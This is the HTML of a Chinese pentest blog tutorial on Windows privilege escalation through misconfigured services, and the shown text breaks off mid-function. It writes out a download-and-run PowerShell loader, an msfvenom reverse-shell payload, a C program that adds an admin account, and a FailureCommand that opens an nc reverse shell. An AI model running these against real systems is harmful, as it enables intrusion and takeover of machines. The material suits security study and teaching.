@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Windows 提权——服务权限配置错误：PowerUp.ps1 检测、无引号服务路径、可写服务二进制替换与注册表权限修改利用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权：服务权限配置错误">
+<meta property="og:url" content="https://congliang.github.io/Windows-privesc-services/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="Windows 提权——服务权限配置错误：PowerUp.ps1 检测、无引号服务路径、可写服务二进制替换与注册表权限修改利用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T16:19:17.588Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Windows-privesc-services/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Windows-privesc-services/","path":"Windows-privesc-services/","title":"Windows提权：服务权限配置错误"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Windows提权：服务权限配置错误 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-PowerUp-ps1-%E5%BF%AB%E9%80%9F%E6%A3%80%E6%B5%8B"><span class="nav-number">2.</span> <span class="nav-text">1. PowerUp.ps1 快速检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Unquoted-Service-Path%EF%BC%88%E6%9C%AA%E5%BC%95%E7%94%A8%E8%B7%AF%E5%BE%84%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">2. Unquoted Service Path（未引用路径）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%8F%AF%E5%86%99%E6%9C%8D%E5%8A%A1%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">3. 可写服务二进制文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9"><span class="nav-number">5.</span> <span class="nav-text">4. 服务注册表权限修改</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B"><span class="nav-number">5.1.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-ImagePath"><span class="nav-number">5.2.</span> <span class="nav-text">修改 ImagePath</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-FailureCommand"><span class="nav-number">5.3.</span> <span class="nav-text">利用 FailureCommand</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-SC-sdshow-%E2%80%94%E2%80%94-%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">5. SC sdshow —— 安全描述符分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%86%B3%E7%AD%96%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">6.1.</span> <span class="nav-text">攻击决策流程图</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E6%9C%8D%E5%8A%A1%E9%87%8D%E5%90%AF%E6%8A%80%E5%B7%A7"><span class="nav-number">7.</span> <span class="nav-text">6. 服务重启技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E7%BB%BC%E5%90%88%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">8.</span> <span class="nav-text">7. 综合攻击流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B"><span class="nav-number">9.</span> <span class="nav-text">8. 实战案例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.</span> <span class="nav-text">9. 防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E6%80%BB%E7%BB%93"><span class="nav-number">11.</span> <span class="nav-text">10. 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">12.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-services/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Windows提权：服务权限配置错误 | 渗透测试实战记录">
+      <meta itemprop="description" content="Windows 提权——服务权限配置错误：PowerUp.ps1 检测、无引号服务路径、可写服务二进制替换与注册表权限修改利用。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows提权：服务权限配置错误
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-12-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-12-01T08:00:00+08:00">2024-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-05 00:19:17" itemprop="dateModified" datetime="2026-06-05T00:19:17+08:00">2026-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">Windows 提权——服务权限配置错误：PowerUp.ps1 检测、无引号服务路径、可写服务二进制替换与注册表权限修改利用。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Windows服务权限配置错误是最常见的本地提权向量之一。低权限用户对服务文件、注册表或服务自身拥有不当权限时，可劫持以SYSTEM运行的服务完成提权。本文系统梳理五种技术：PowerUp自动化检测、Unquoted Service Path、可写二进制替换、注册表权限修改、SC sdshow分析以及服务重启技巧。</p>
+<hr>
+<h2 id="1-PowerUp-ps1-快速检测"><a href="#1-PowerUp-ps1-快速检测" class="headerlink" title="1. PowerUp.ps1 快速检测"></a>1. PowerUp.ps1 快速检测</h2><p>PowerUp.ps1是PowerSploit框架的提权模块，<code>Invoke-AllChecks</code>遍历所有已注册服务，检查可写路径、可写二进制、注册表ACL及服务权限缺陷。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> Bypass</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br><span class="line"><span class="comment"># 远程加载</span></span><br><span class="line"><span class="built_in">iex</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://&lt;ip&gt;/PowerUp.ps1&#x27;</span>)</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure>
+
+<p>核心检查项与典型漏洞：</p>
+<table>
+<thead>
+<tr>
+<th>检查项</th>
+<th>说明</th>
+<th>典型表现</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Get-ServiceUnquoted</code></td>
+<td>路径含空格未加引号</td>
+<td><code>C:\Program Files\App\svc.exe</code></td>
+</tr>
+<tr>
+<td><code>Get-ModifiableServiceFile</code></td>
+<td>服务二进制可写</td>
+<td><code>BUILTIN\Users</code> 有Write&#x2F;FullControl</td>
+</tr>
+<tr>
+<td><code>Get-ModifiableService</code></td>
+<td>服务ACL缺陷</td>
+<td>低权限用户可改binPath</td>
+</tr>
+<tr>
+<td><code>Get-ServiceRegistryPermission</code></td>
+<td>注册表项ACL宽松</td>
+<td>Services&lt;svc&gt;可写</td>
+</tr>
+</tbody></table>
+<p>每个漏洞都会附带<code>AbuseFunction</code>，直接复制执行即可利用。</p>
+<hr>
+<h2 id="2-Unquoted-Service-Path（未引用路径）"><a href="#2-Unquoted-Service-Path（未引用路径）" class="headerlink" title="2. Unquoted Service Path（未引用路径）"></a>2. Unquoted Service Path（未引用路径）</h2><p>当服务路径含空格但未用双引号时，SCM按以下顺序尝试定位可执行文件。以路径<code>C:\Program Files\Vuln App\bin\service.exe</code>为例：</p>
+<ol>
+<li><code>C:\Program.exe</code></li>
+<li><code>C:\Program Files\Vuln.exe</code></li>
+<li><code>C:\Program Files\Vuln App\bin\service.exe</code> ← 实际目标</li>
+</ol>
+<p>若攻击者对任一中间路径有写入权限，植入恶意exe后服务重启即被SCM执行。</p>
+<p>手工检测命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,pathname,startmode | <span class="built_in">findstr</span> /i auto | <span class="built_in">findstr</span> /i /v &quot;C:\Windows&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.PathName <span class="operator">-notlike</span> <span class="string">&#x27;&quot;*&#x27;</span> <span class="operator">-and</span> <span class="variable">$_</span>.PathName <span class="operator">-like</span> <span class="string">&#x27;* *&#x27;</span> &#125; | <span class="built_in">Select-Object</span> Name, PathName, StartMode</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用示例</strong>：服务<code>VulnSvc</code>路径为<code>C:\Program Files\Vuln App\bin\app.exe</code>。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\Program Files\Vuln App&quot;</span><br></pre></td></tr></table></figure>
+
+<p>若含<code>BUILTIN\Users:(M)</code>即存在写入权限。生成载荷：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Vuln.exe</span><br></pre></td></tr></table></figure>
+
+<p>将<code>Vuln.exe</code>复制到父目录，SCM首次匹配到<code>Vuln.exe</code>即停止搜索并以SYSTEM执行。</p>
+<hr>
+<h2 id="3-可写服务二进制文件"><a href="#3-可写服务二进制文件" class="headerlink" title="3. 可写服务二进制文件"></a>3. 可写服务二进制文件</h2><p>检测当前用户对服务二进制文件的写入权限：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ModifiableServiceFile</span></span><br><span class="line"><span class="comment"># 手工检查</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.StartMode <span class="operator">-eq</span> <span class="string">&#x27;Auto&#x27;</span> &#125; | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$path</span> = (<span class="variable">$_</span>.PathName <span class="operator">-replace</span> <span class="string">&#x27;^&quot;|&quot;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="variable">$path</span>) &#123;</span><br><span class="line">        (<span class="built_in">Get-Acl</span> <span class="variable">$path</span>).Access | <span class="built_in">Where-Object</span> &#123;</span><br><span class="line">            <span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&#x27;FullControl|Modify|Write&#x27;</span> <span class="operator">-and</span></span><br><span class="line">            <span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&#x27;Users|Everyone|Authenticated Users&#x27;</span></span><br><span class="line">        &#125; | % &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;[!] <span class="variable">$path</span> -&gt; <span class="variable">$_</span>&quot;</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用流程：备份原文件 → 覆盖为恶意文件 → 重启服务获取SYSTEM → 恢复原文件。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> &quot;C:\Program Files\Target\svc.exe&quot; &quot;C:\Program Files\Target\svc.exe.bak&quot;</span><br><span class="line"><span class="built_in">copy</span> /y malicious.exe &quot;C:\Program Files\Target\svc.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>自定义载荷示例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cmd.exe /c net user agent P@ssw0rd /add&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cmd.exe /c net localgroup administrators agent /add&quot;</span>);</span><br><span class="line">    WinExec(<span class="string">&quot;C:\\Program Files\\Target\\svc.exe.bak&quot;</span>, SW_HIDE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-服务注册表权限修改"><a href="#4-服务注册表权限修改" class="headerlink" title="4. 服务注册表权限修改"></a>4. 服务注册表权限修改</h2><p>服务配置存储于<code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt;</code>。若普通用户拥有<code>SetValue</code>或<code>FullControl</code>权限，可修改关键值实现提权。</p>
+<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Acl</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc&quot;</span> | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修改-ImagePath"><a href="#修改-ImagePath" class="headerlink" title="修改 ImagePath"></a>修改 ImagePath</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;ImagePath&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\temp\payload.exe&quot;</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">sc</span> config VulnSvc binPath= <span class="string">&quot;C:\temp\payload.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-FailureCommand"><a href="#利用-FailureCommand" class="headerlink" title="利用 FailureCommand"></a>利用 FailureCommand</h3><p>服务失败恢复机制：当服务连续失败达到阈值时执行预设命令。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> failure VulnSvc reset= <span class="number">0</span> actions= restart/<span class="number">60000</span>/restart/<span class="number">60000</span>/run/<span class="number">60000</span></span><br><span class="line"><span class="built_in">sc</span> failure VulnSvc command= <span class="string">&quot;C:\temp\nc.exe 10.10.14.5 4444 -e cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>也可直接修改注册表：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc&quot; /v FailureCommand /t REG_SZ /d &quot;<span class="built_in">cmd</span>.exe /c C:\temp\shell.bat&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>修改后重启服务或诱发服务崩溃即可触发载荷。</p>
+<hr>
+<h2 id="5-SC-sdshow-——-安全描述符分析"><a href="#5-SC-sdshow-——-安全描述符分析" class="headerlink" title="5. SC sdshow —— 安全描述符分析"></a>5. SC sdshow —— 安全描述符分析</h2><p><code>sc sdshow</code>查看服务SDDL安全描述符，精确判断各主体对服务的权限。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc sdshow &lt;ServiceName&gt;</span><br></pre></td></tr></table></figure>
+
+<p>SDDL结构：<code>D:(A;;[权限位];;;[SID])</code></p>
+<ul>
+<li><strong>A</strong>&#x3D;Allow, <strong>D</strong>&#x3D;Deny</li>
+<li>常用SID：<code>SY</code>&#x3D;LocalSystem, <code>BA</code>&#x3D;Administrators, <code>BU</code>&#x3D;Users, <code>WD</code>&#x3D;Everyone, <code>AU</code>&#x3D;Authenticated Users</li>
+</ul>
+<p>常见高危SDDL模式：</p>
+<table>
+<thead>
+<tr>
+<th>SDDL片段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>(A;;KA;;;WD)</code></td>
+<td>Everyone完全控制</td>
+</tr>
+<tr>
+<td><code>(A;;CCDCLCSWRP;;;WD)</code></td>
+<td>Everyone可改配置并启停</td>
+</tr>
+<tr>
+<td><code>(A;;RPWP;;;BU)</code></td>
+<td>Users可读写服务属性</td>
+</tr>
+<tr>
+<td><code>(A;;CCLCSWRPLORC;;;WD)</code></td>
+<td>Everyone可启动&#x2F;停止&#x2F;读取</td>
+</tr>
+</tbody></table>
+<p>示例解读：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc sdshow VulnSvc</span><br><span class="line"><span class="function">D:(<span class="title">A</span>;;<span class="title">CCLCSWRPWPDTLOCRRC</span>;;;<span class="title">SY</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">BA</span>)(<span class="title">A</span>;;<span class="title">CCLCSWRPLORC</span>;;;<span class="title">WD</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>SY完全控制、BA完全控制、<strong>WD拥有StartService+StopService+ReadControl</strong>——任何人可启停该服务。</p>
+<h3 id="攻击决策流程图"><a href="#攻击决策流程图" class="headerlink" title="攻击决策流程图"></a>攻击决策流程图</h3><pre class="mermaid">flowchart TD
+    A[sc sdshow SERVICE] --> B{SID含BU/AU/WD?}
+    B -->|否| C[服务ACL安全]
+    B -->|是| D{有WriteDAC?}
+    D -->|是| E["授予自身完全控制权"]
+    D -->|否| F{有SERVICE_CHANGE_CONFIG?}
+    F -->|是| G["sc config binPath= payload.exe"]
+    F -->|否| H{有SERVICE_START/STOP?}
+    H -->|是| I[结合可写路径或文件利用]
+    H -->|否| J[权限有限,寻找其他目标]</pre>
+
+<hr>
+<h2 id="6-服务重启技巧"><a href="#6-服务重启技巧" class="headerlink" title="6. 服务重启技巧"></a>6. 服务重启技巧</h2><p>多数利用需重启服务生效。获取状态：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Service</span> VulnSvc | <span class="built_in">Select-Object</span> Name, StartType, Status</span><br></pre></td></tr></table></figure>
+
+<p>常规启停：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Stop-Service</span> VulnSvc <span class="literal">-Force</span>       <span class="comment"># 或 sc stop VulnSvc</span></span><br><span class="line"><span class="built_in">Start-Service</span> VulnSvc             <span class="comment"># 或 sc start VulnSvc</span></span><br></pre></td></tr></table></figure>
+
+<p>当服务无法停止时的策略：</p>
+<ul>
+<li><strong>诱导崩溃</strong>：若可修改<code>FailureCommand</code>，让服务崩溃后自动执行载荷</li>
+<li><strong>利用依赖关系</strong>：<code>sc enumdepend VulnSvc</code> 寻找可被停止的依赖项</li>
+<li><strong>等待重启</strong>：载荷植入后等待主机下次重启（Automatic类型自动启动）</li>
+<li><strong>强制重启</strong>：<code>shutdown /r /t 0</code>（最可靠但影响业务）</li>
+</ul>
+<p>辅助函数封装：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-ServiceRestart</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>([<span class="built_in">string</span>]<span class="variable">$ServiceName</span>, [<span class="built_in">string</span>]<span class="variable">$NewBinPath</span> = <span class="variable">$null</span>)</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;[*] Status: <span class="variable">$</span>((Get-Service <span class="variable">$ServiceName</span>).Status)&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$NewBinPath</span>) &#123;</span><br><span class="line">        